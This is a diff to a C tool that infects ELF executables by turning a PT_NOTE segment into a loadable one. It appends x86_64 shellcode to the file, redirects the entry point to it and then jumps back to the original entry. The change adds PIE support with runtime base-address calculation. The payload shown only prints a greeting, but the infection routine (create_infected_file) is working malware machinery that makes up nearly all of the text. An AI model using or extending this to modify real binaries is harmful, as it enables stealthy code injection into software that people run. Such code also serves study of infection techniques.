@@ -9,7 +9,58 @@
 // Shellcode to print "hello world from pt_load\n"
 // This is x86_64 assembly that uses syscall to write to stdout
 // Preserves all registers and stack state before jumping to original entry
-unsigned char shellcode[] = {
+// PIE-compatible version that calculates the base address at runtime
+unsigned char shellcode_pie[] = {
+    // Save all callee-saved registers
+    0x50,                               // push rax
+    0x51,                               // push rcx
+    0x52,                               // push rdx
+    0x53,                               // push rbx
+    0x56,                               // push rsi
+    0x57,                               // push rdi
+    0x55,                               // push rbp
+    0x41, 0x50,                         // push r8
+    0x41, 0x51,                         // push r9
+    0x41, 0x52,                         // push r10
+    0x41, 0x53,                         // push r11
+    // write(1, message, message_len)
+    0xb8, 0x01, 0x00, 0x00, 0x00,       // mov eax, 1 (sys_write)
+    0xbf, 0x01, 0x00, 0x00, 0x00,       // mov edi, 1 (stdout)
+    0x48, 0x8d, 0x35, 0x39, 0x00, 0x00, 0x00,  // lea rsi, [rip+0x39]  (message)
+    0xba, 0x1a, 0x00, 0x00, 0x00,       // mov edx, 26 (message length)
+    0x0f, 0x05,                         // syscall
+    // Restore all registers
+    0x41, 0x5b,                         // pop r11
+    0x41, 0x5a,                         // pop r10
+    0x41, 0x59,                         // pop r9
+    0x41, 0x58,                         // pop r8
+    0x5d,                               // pop rbp
+    0x5f,                               // pop rdi
+    0x5e,                               // pop rsi
+    0x5b,                               // pop rbx
+    0x5a,                               // pop rdx
+    0x59,                               // pop rcx
+    0x58,                               // pop rax
+    // For PIE: Calculate base address and add original entry offset
+    // Get current RIP into rax
+    0x48, 0x8d, 0x05, 0x00, 0x00, 0x00, 0x00,  // lea rax, [rip]  (current address)
+    // Load injection_vaddr into rbx (will be patched)
+    0x48, 0xbb, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs rbx, injection_vaddr (10 bytes)
+    // Calculate base: base = current_rip - injection_vaddr
+    0x48, 0x29, 0xd8,                   // sub rax, rbx
+    // Load original entry offset into rbx (will be patched)
+    0x48, 0xbb, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs rbx, original_entry (10 bytes)
+    // Calculate actual entry: actual_entry = base + original_entry
+    0x48, 0x01, 0xd8,                   // add rax, rbx
+    // Jump to the calculated address
+    0xff, 0xe0,                         // jmp rax
+    // Message: "hello world from pt_load\n"
+    'h', 'e', 'l', 'l', 'o', ' ', 'w', 'o', 'r', 'l', 'd', ' ',
+    'f', 'r', 'o', 'm', ' ', 'p', 't', '_', 'l', 'o', 'a', 'd', '\n', 0x00
+};
+
+// Shellcode for non-PIE executables (original version)
+unsigned char shellcode_nopie[] = {
     // Save all callee-saved registers
     0x50,                               // push rax
     0x51,                               // push rcx
@@ -40,7 +91,7 @@ unsigned char shellcode[] = {
     0x5a,                               // pop rdx
     0x59,                               // pop rcx
     0x58,                               // pop rax
-    // Jump to original entry point (will be patched with absolute address)
+    // Jump to original entry point (absolute address)
     0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs rax, original_entry (10 bytes)
     0xff, 0xe0,                         // jmp rax
     // Message: "hello world from pt_load\n"
@@ -56,6 +107,7 @@ typedef struct {
     size_t pt_note_offset;
     int pt_note_index;
     uint64_t original_entry;
+    int is_pie;  // 1 if PIE (ET_DYN), 0 if static executable (ET_EXEC)
 } ElfData;
 
 void read_elf_file(const char *filename, ElfData *data) {
@@ -110,6 +162,18 @@ int validate_elf(ElfData *data) {
         return 0;
     }
 
+    // Check if it's PIE (ET_DYN) or static executable (ET_EXEC)
+    if (data->elf_header->e_type == ET_DYN) {
+        data->is_pie = 1;
+        printf("Detected PIE (Position Independent Executable)\n");
+    } else if (data->elf_header->e_type == ET_EXEC) {
+        data->is_pie = 0;
+        printf("Detected non-PIE executable\n");
+    } else {
+        fprintf(stderr, "Unsupported ELF type: %d\n", data->elf_header->e_type);
+        return 0;
+    }
+
     return 1;
 }
 
@@ -131,8 +195,20 @@ int find_pt_note(ElfData *data) {
 }
 
 void create_infected_file(const char *output_filename, ElfData *data) {
+    // Select the appropriate shellcode based on whether it's PIE or not
+    unsigned char *shellcode;
+    size_t shellcode_size;
+    
+    if (data->is_pie) {
+        shellcode = shellcode_pie;
+        shellcode_size = sizeof(shellcode_pie);
+    } else {
+        shellcode = shellcode_nopie;
+        shellcode_size = sizeof(shellcode_nopie);
+    }
+    
     // Calculate new file size (original + shellcode)
-    size_t new_file_size = data->file_size + sizeof(shellcode);
+    size_t new_file_size = data->file_size + shellcode_size;
     char *output_data = malloc(new_file_size);
     if (!output_data) {
         perror("Memory allocation failed");
@@ -160,16 +236,42 @@ void create_infected_file(const char *output_filename, ElfData *data) {
     out_pt_note->p_offset = data->file_size;  // Offset in file (at the end)
     out_pt_note->p_vaddr = injection_vaddr;
     out_pt_note->p_paddr = injection_vaddr;
-    out_pt_note->p_filesz = sizeof(shellcode);
-    out_pt_note->p_memsz = sizeof(shellcode);
+    out_pt_note->p_filesz = shellcode_size;
+    out_pt_note->p_memsz = shellcode_size;
     out_pt_note->p_align = 0x1000;  // Page alignment
 
-    // Patch the shellcode with the original entry point
-    // The address is at offset 56 (54 for start of movabs instruction + 2 for opcode)
-    memcpy(shellcode + 56, &data->original_entry, sizeof(uint64_t));
+    // Copy shellcode to a temporary buffer for patching
+    unsigned char *patched_shellcode = malloc(shellcode_size);
+    if (!patched_shellcode) {
+        perror("Memory allocation failed");
+        free(output_data);
+        exit(1);
+    }
+    memcpy(patched_shellcode, shellcode, shellcode_size);
 
-    // Append shellcode to the end of file
-    memcpy(output_data + data->file_size, shellcode, sizeof(shellcode));
+    if (data->is_pie) {
+        // For PIE: patch both injection_vaddr and original_entry offset
+        // When 'lea rax, [rip]' at offset 54 executes, RIP points to offset 61
+        // So we need to store (injection_vaddr + 61) to calculate the base
+        // The first movabs immediate is at offset 63 (61 + 2 for opcode)
+        // The second movabs immediate is at offset 76 (74 + 2 for opcode)
+        uint64_t rip_value = injection_vaddr + 61;
+        memcpy(patched_shellcode + 63, &rip_value, sizeof(uint64_t));
+        memcpy(patched_shellcode + 76, &data->original_entry, sizeof(uint64_t));
+        
+        printf("PIE mode: rip_value=0x%lx, original_entry_offset=0x%lx\n", 
+               rip_value, data->original_entry);
+    } else {
+        // For non-PIE: patch the absolute address
+        // The address is at offset 56 (54 for start of movabs instruction + 2 for opcode)
+        memcpy(patched_shellcode + 56, &data->original_entry, sizeof(uint64_t));
+        
+        printf("Non-PIE mode: original_entry=0x%lx\n", data->original_entry);
+    }
+
+    // Append patched shellcode to the end of file
+    memcpy(output_data + data->file_size, patched_shellcode, shellcode_size);
+    free(patched_shellcode);
 
     // Change entry point to point to our injected code
     out_elf_header->e_entry = injection_vaddr;
